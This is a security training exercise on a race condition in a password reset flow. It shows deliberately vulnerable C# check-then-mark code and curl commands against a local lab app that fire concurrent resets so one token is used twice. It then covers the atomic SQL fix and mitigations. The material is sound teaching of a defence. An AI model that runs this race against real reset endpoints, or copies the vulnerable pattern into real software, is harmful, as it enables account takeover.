# Exercise 07 — Race Conditions: Password Reset Token

**Difficulty:** Intermediate  
**Category:** Race Conditions / TOCTOU  
**OWASP Top 10:** A07:2021 — Identification and Authentication Failures  
**Config flag:** `BookingDojo:Workshop:PasswordResetRaceCondition`

---

## Scenario

The password reset flow issues a single-use token. The token invalidation is implemented as check-then-mark: the server reads the token, confirms `UsedAt IS NULL`, waits (simulating real-world I/O), then marks it used and updates the password. Two concurrent requests with the same token can both pass the check before either writes — allowing an attacker who intercepts one reset token to use it twice (or more) to set the password back to one they control, locking the victim out.

---

## Background

Password reset tokens are a high-value target: a single stolen token can grant account takeover. The TOCTOU pattern is especially dangerous here because:

- The token is often transmitted over unencrypted channels (email, SMS)
- The race window can persist for hundreds of milliseconds in real implementations
- The victim does not know the token has been double-consumed — both write operations succeed silently

---

## Setup

```bash
docker compose up -d
dotnet run --project src/BookingDojo.Api -- --seed-and-exit
dotnet run --project src/BookingDojo.Api &
dotnet run --project src/BookingDojo.Bff &
cd src/bookingdojo-ui && npm run dev &
```

In `appsettings.json`:

```json
"PasswordResetRaceCondition": "Vulnerable"
```

---

## Step 1 — Request a reset token

```bash
# Request a reset token for the partner account
curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq .
```

Expected response (workshop returns the token directly — production would email it):

```json
{
  "message": "Reset token issued (workshop: token returned in response, not emailed)",
  "resetToken": "a3f8c1d2e9b04f67...",
  "expiresAt": "2026-05-04T13:00:00Z"
}
```

Save the token:

```bash
TOKEN="a3f8c1d2e9b04f67..."
```

---

## Step 2 — Observe normal single-use behaviour

```bash
# First use succeeds
curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"NewPass1234!\"}" | jq .

# Second use with same token is rejected
curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"AnotherPass!\"}" | jq .
```

Expected: first returns `200`, second returns `400 Bad Request` — token already marked as used.

---

## Step 3 — Understand the vulnerable code

```csharp
// Time of Check
var token = await _db.PasswordResetTokens.Include(t => t.User)
    .FirstOrDefaultAsync(t => t.Token == request.Token
                           && t.UsedAt == null
                           && t.ExpiresAt > now);
if (token == null)
    return BadRequest("Invalid or expired reset token");

// Race window — 500 ms artificial delay
await Task.Delay(500);

// Time of Use — another request may have already set UsedAt
token.UsedAt = DateTime.UtcNow;
token.User.PasswordHash = BCrypt.Net.BCrypt.HashPassword(request.NewPassword);
await _db.SaveChangesAsync();
```

The window between reading `UsedAt` and writing it is the race window.

---

## Step 4 — Exploit the race

Request a fresh token, then send two concurrent requests before either marks it used:

```bash
# Get a fresh token
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

echo "Token: $TOKEN"

# Fire both requests simultaneously
curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Attacker1234!\"}" | jq . &

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Victim5678!\"}" | jq . &

wait
```

Expected: **both** requests return `200 OK`. The password is set to whichever write lands last — the attacker can retry until their write wins.

**Attack scenario**: Victim clicks "Forgot password", attacker intercepts the token (email in transit, phishing, or logs), then races the victim's legitimate reset. If the attacker's write lands last, the victim's new password is immediately overwritten.

---

## Step 5 — Apply the fix

In `appsettings.json`:

```json
"PasswordResetRaceCondition": "Fixed"
```

Restart the API, request a fresh token, and repeat the concurrent exploit:

```bash
TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"username":"partner"}' | jq -r '.resetToken')

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Attacker1234!\"}" | jq . &

curl -s -X POST http://localhost:5001/bff/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"newPassword\":\"Victim5678!\"}" | jq . &

wait
```

Expected: exactly one `200 OK` and one `409 Conflict`.

The fixed code:

```sql
UPDATE bookingdojo."PasswordResetTokens"
SET "UsedAt" = @now
WHERE "Token" = @token AND "UsedAt" IS NULL AND "ExpiresAt" > @now
```

If `rows == 0`, the token was already claimed. Only after the atomic claim succeeds does the server update the password.

---

## Step 6 — Discussion

| Control | Protection |
|---------|-----------|
| Atomic UPDATE WHERE UsedAt IS NULL | Closes the race window at the DB layer |
| Short token expiry (< 15 min) | Limits the window of opportunity for interception |
| IP binding | Ties the token to the requestor's IP (reduces race impact) |
| One active token per user | Invalidating old tokens on new request (already implemented) |
| Rate limiting on reset endpoint | Prevents brute-force of short token spaces |
| Secure token delivery (signed email link) | Reduces interception risk |

---

## Key Takeaways

- **Single-use does not mean atomic.** Checking then writing is two operations; between them, anything can happen.
- **Email delivery adds latency.** The race window in production is not 500 ms — it can be minutes (victim opens email, attacker intercepts during delivery). More time = larger window.
- **The fix is a WHERE clause.** One line of SQL eliminates the race at zero cost to performance.

---

## Further Reading

- [OWASP A07:2021 — Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [CWE-362 — Race Condition](https://cwe.mitre.org/data/definitions/362.html)
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
